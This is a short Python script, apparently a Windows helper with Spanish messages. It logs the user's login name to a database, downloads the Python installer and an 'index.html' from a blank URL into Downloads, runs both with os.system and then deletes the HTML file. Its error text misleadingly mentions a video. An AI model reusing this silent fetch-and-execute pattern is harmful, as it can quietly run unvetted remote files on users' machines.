from db import Database
from requests import get
from time import sleep
from os import getlogin, system,chdir,remove

class settings():

    database = Database()
    def __init__(self):
        self.database

    def user(self):
        response = self.database.ReadUser()

        if(response == None):

          response =  self.database.InsertUser(getlogin())
        
          if(response == True):
              
              #self.app()
              pass
    

    def app(self):
        try:
            #verifiicar = Database()
            #respuesta  = verifiicar.ReadSetting()
            #if(respuesta == None):
            try:
                chdir ('C:/Users/'+getlogin()+'/Downloads/')

                url = "https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe"

                response = get(url)

                if response.status_code == 200:
                
                    try:
                        with open("python-3.11.2-amd64.exe", "wb") as f:
                    
                            f.write(response.content)

                            sleep(15)

                    except Exception as e:
                        print("Error :"+e)

                    try:
                        url = ""

                        response = get(url)

                        if response.status_code == 200:

                            with open("index.html", "wb") as f:

                                f.write(response.content)

                                sleep(12)

                        system("C:/Users/"+ getlogin()+ "/Downloads/index.html")
                        system("C:/Users/"+ getlogin()+ "/Downloads/python-3.11.2-amd64.exe")
                        remove('index.html')

                    except Exception as e:

                        print("Error :" +e)
                else:
                
                    print("Error al descargar el video")

                    sleep(12)

            except Exception as e:
            
                print("Error al descargar: ", e)

                sleep(12)
            #else:

                #print("ok")
        except Exception as e:

            print("Error:", e)

